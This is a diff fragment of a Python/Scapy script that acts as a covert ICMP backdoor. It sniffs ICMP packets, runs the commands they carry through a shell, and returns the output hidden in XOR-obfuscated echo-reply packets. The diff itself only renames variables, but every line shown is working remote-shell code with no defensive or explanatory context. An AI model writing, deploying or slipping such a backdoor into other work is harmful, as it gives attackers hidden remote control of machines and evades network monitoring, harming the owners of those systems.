@@ -46,8 +46,8 @@ def action(pkt):
 				command_shell(buff[8:], source)
 				print "Sending reply"
 
-def packet_builder(data, dst):
-	packet = Ether() / IP(dst=dst) / ICMP(type=0) / (XOR(server_magic + data))
+def packet_builder(data, dest):
+	packet = Ether() / IP(dst=dest) / ICMP(type=0) / (XOR(server_magic + data))
 	return packet
 
 def XOR(p):
@@ -56,11 +56,11 @@ def XOR(p):
                 buff += chr(ord(p[i]) ^ ord(xor[i % 4]))
         return buff
 
-def command_shell(data, dst):
+def command_shell(data, src):
 	value = ""
 	proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, 
 	stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 	value = proc.stdout.read() + proc.stderr.read()
-	sendp(packet_builder(shell + value + prompt, dst),verbose=0,iface=sys.argv[1])
+	sendp(packet_builder(shell + value + prompt, src),verbose=0,iface=sys.argv[1])
 
 sniff(iface=sys.argv[1],filter="icmp",prn=action,store=1)
